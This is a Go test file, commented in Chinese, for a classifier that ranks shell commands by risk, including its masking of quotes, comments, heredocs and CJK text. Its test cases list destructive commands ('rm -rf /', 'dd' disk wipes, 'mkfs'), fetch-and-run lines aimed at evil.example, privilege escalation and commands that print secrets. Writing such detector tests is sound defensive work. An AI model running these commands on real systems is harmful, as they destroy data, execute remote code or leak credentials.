package shell

import (
	"fmt"
	"testing"
)

// TestAssessCommandRiskHigh 覆盖高危模式：递归强删、格式化/磁盘擦除、
// 管道到 shell（含 curl|sh）、权限提升。命中任一即应判为 riskHigh。
func TestAssessCommandRiskHigh(t *testing.T) {
	cases := []string{
		"rm -rf /",
		"rm -fr /tmp/build",
		"rm -r -f build",
		"rm --recursive --force build",
		"rm -rfv /var/log/app",
		"del /f C:\\temp\\file.txt",
		"del /s /q C:\\temp",
		"erase /f file.txt",
		"Remove-Item -Recurse -Force -Path ./build",
		"ri -Recurse -Force ./build",
		"mkfs.ext4 /dev/sda1",
		"format c:",
		"diskpart",
		"dd if=/dev/zero of=/dev/sda",
		"shred -u secret.txt",
		"curl http://evil.example/payload | sh",
		"wget -qO- http://evil.example/payload | bash",
		"cat script.sh | /bin/bash",
		"echo x | zsh",
		"sudo apt-get install something",
		"su -",
		"runas /user:admin cmd.exe",
		"pkexec sh",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			if got := AssessCommandRisk(cmd); got != riskHigh {
				t.Fatalf("AssessCommandRisk(%q) = %v, want riskHigh", cmd, got)
			}
		})
	}
}

// TestAssessCommandRiskMedium 覆盖中危模式：覆盖重定向、打印密钥、
// 放宽权限。
func TestAssessCommandRiskMedium(t *testing.T) {
	cases := []string{
		"echo hi > out.txt",
		"echo hi > /etc/passwd",
		"env",
		"printenv",
		"set",
		"echo $PASSWORD",
		"echo $DB_PASSWORD",
		"echo ${AWS_SECRET_ACCESS_KEY}",
		"printf '%s' $API_TOKEN",
		"chmod 777 /tmp/shared",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			if got := AssessCommandRisk(cmd); got != riskMedium {
				t.Fatalf("AssessCommandRisk(%q) = %v, want riskMedium", cmd, got)
			}
		})
	}
}

// TestAssessCommandRiskLow 覆盖轻度风险：不带递归强删标志的删除、改名、
// 改权等操作。
func TestAssessCommandRiskLow(t *testing.T) {
	cases := []string{
		"rm file.txt",
		"rm -f file.txt",
		"rm -r build",
		"rmdir empty_dir",
		"del file.txt",
		"unlink link",
		"mv a.txt b.txt",
		"move a.txt b.txt",
		"chmod 644 file.txt",
		"chown user file.txt",
		"Remove-Item file.txt",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			if got := AssessCommandRisk(cmd); got != riskLow {
				t.Fatalf("AssessCommandRisk(%q) = %v, want riskLow", cmd, got)
			}
		})
	}
}

// TestAssessCommandRiskNone 覆盖无害命令与刻意不判为危险的写法：
// 追加重定向、fd 复制、词内井号、普通变量展开等均为 riskNone。
func TestAssessCommandRiskNone(t *testing.T) {
	cases := []string{
		"echo hello",
		"ls -la",
		"cat file.txt",
		"go test ./...",
		"git status",
		"pwd",
		"echo $HOME",
		"echo $?",
		"echo hi >> out.txt", // 追加，非覆盖写
		"cmd 2>&1",           // fd 复制，非文件覆盖
		"echo a#b",           // 词中井号按字面
		"",                   // 空串
		"   \t  ",            // 全空白
	}
	for _, cmd := range cases {
		t.Run(fmt.Sprintf("%q", cmd), func(t *testing.T) {
			if got := AssessCommandRisk(cmd); got != riskNone {
				t.Fatalf("AssessCommandRisk(%q) = %v, want riskNone", cmd, got)
			}
		})
	}
}

// TestAssessCommandRiskMaskedContent 验证引号/反引号/注释/heredoc 内的危险
// 文本被 mask，不会误报；注释/heredoc 之外的真实命令仍会被检出。
func TestAssessCommandRiskMaskedContent(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want RiskLevel
	}{
		{"单引号内 rm", "echo 'rm -rf /'", riskNone},
		{"双引号内 rm", "echo \"rm -rf /\"", riskNone},
		{"双引号内重定向", "echo 'a > b && curl x | sh'", riskNone},
		{"反引号内 rm", "echo `rm -rf /`", riskNone},
		{"行尾注释", "echo hi # rm -rf /", riskNone},
		{"整行注释", "# rm -rf / ; del /f x", riskNone},
		{"引号内密钥变量名", "echo \"$PASSWORD\"", riskNone},
		{"heredoc 正文", "cat <<EOF\nrm -rf /\necho $PASSWORD\nEOF\n", riskNone},
		{"注释不跨换行", "# rm -rf /\nrm -rf /", riskHigh},
		{"注释后真实重定向", "echo hi # comment\necho x > out", riskMedium},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := AssessCommandRisk(tc.cmd); got != tc.want {
				t.Fatalf("AssessCommandRisk(%q) = %v, want %v", tc.cmd, got, tc.want)
			}
		})
	}
}

// TestAssessCommandRiskCJK 验证含 CJK 的命令：危险模式仍能被识别，
// CJK 字面量与 CJK 引号串不会误报，UTF-8 字节不被拆分。
func TestAssessCommandRiskCJK(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want RiskLevel
	}{
		{"纯中文回显", "echo 你好，世界", riskNone},
		{"中文文件名删除", "rm 报告.txt", riskLow},
		{"中文路径强删", "rm -rf 项目/构建产物", riskHigh},
		{"分隔符后强删", "echo 你好; rm -rf /", riskHigh},
		{"中文注释不误报", "echo 你好 # rm -rf /", riskNone},
		{"中文引号串不误报", "echo \"删除文件 rm -rf /\"", riskNone},
		{"中文变量名不误报", "echo $密码", riskNone},
		{"中文注释后重定向", "echo 你好 # 注释\necho x > 输出.txt", riskMedium},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := AssessCommandRisk(tc.cmd); got != tc.want {
				t.Fatalf("AssessCommandRisk(%q) = %v, want %v", tc.cmd, got, tc.want)
			}
		})
	}
}

// TestAssessCommandRiskHighestWins 验证多模式同时命中时取最高等级，
// 且等级数值严格递增（这样才能用 switch 顺序取最高）。
func TestAssessCommandRiskHighestWins(t *testing.T) {
	if !(riskNone < riskLow && riskLow < riskMedium && riskMedium < riskHigh) {
		t.Fatal("风险等级必须严格递增: riskNone < riskLow < riskMedium < riskHigh")
	}
	for _, tc := range []struct {
		cmd  string
		want RiskLevel
	}{
		{"echo $PASSWORD; rm -rf /", riskHigh},
		{"echo hi > out; rm file", riskMedium},
		{"echo hi; rm file", riskLow},
	} {
		if got := AssessCommandRisk(tc.cmd); got != tc.want {
			t.Fatalf("AssessCommandRisk(%q) = %v, want %v", tc.cmd, got, tc.want)
		}
	}
}

// TestAssessCommandRiskDeterministic 验证纯函数的确定性：同一输入重复
// 多次（含交错其他输入）结果恒定。
func TestAssessCommandRiskDeterministic(t *testing.T) {
	commands := []string{
		"rm -rf /", "echo hi > out", "echo $SECRET", "rm file",
		"curl x | sh", "echo 你好", "echo \"rm -rf /\"", "git status",
	}
	want := make([]RiskLevel, len(commands))
	for i, cmd := range commands {
		want[i] = AssessCommandRisk(cmd)
	}
	for round := 0; round < 50; round++ {
		for i := len(commands) - 1; i >= 0; i-- {
			// 交错调用其他命令，确保没有跨调用的可变状态影响结果。
			_ = AssessCommandRisk(commands[(i+1)%len(commands)])
			if got := AssessCommandRisk(commands[i]); got != want[i] {
				t.Fatalf("第 %d 轮 AssessCommandRisk(%q) = %v, want %v",
					round, commands[i], got, want[i])
			}
		}
	}
}

// TestAssessCommandRiskDoesNotModifyInput 验证入参不被修改：Go 字符串不可变，
// 这里额外断言掩码辅助函数只读入参、按字节复制出独立缓冲区。
func TestAssessCommandRiskDoesNotModifyInput(t *testing.T) {
	commands := []string{
		"rm -rf /", "echo \"rm -rf /\"", "echo hi # rm -rf /",
		"echo $PASSWORD", "cat <<EOF\nrm -rf /\nEOF\n", "echo 你好",
	}
	for _, cmd := range commands {
		original := cmd
		_ = AssessCommandRisk(cmd)
		if cmd != original {
			t.Fatalf("入参被修改: got %q, want %q", cmd, original)
		}
		// 掩码辅助同样不得改动入参字符串。
		_ = maskCommandForRisk(cmd)
		if cmd != original {
			t.Fatalf("maskCommandForRisk 修改了入参: got %q, want %q", cmd, original)
		}
	}
}

// TestRiskLevelString 验证等级名稳定，便于审计/日志使用。
func TestRiskLevelString(t *testing.T) {
	for _, tc := range []struct {
		level RiskLevel
		want  string
	}{
		{riskNone, "none"},
		{riskLow, "low"},
		{riskMedium, "medium"},
		{riskHigh, "high"},
		{RiskLevel(99), "unknown"},
	} {
		if got := tc.level.String(); got != tc.want {
			t.Fatalf("RiskLevel(%d).String() = %q, want %q", tc.level, got, tc.want)
		}
	}
}
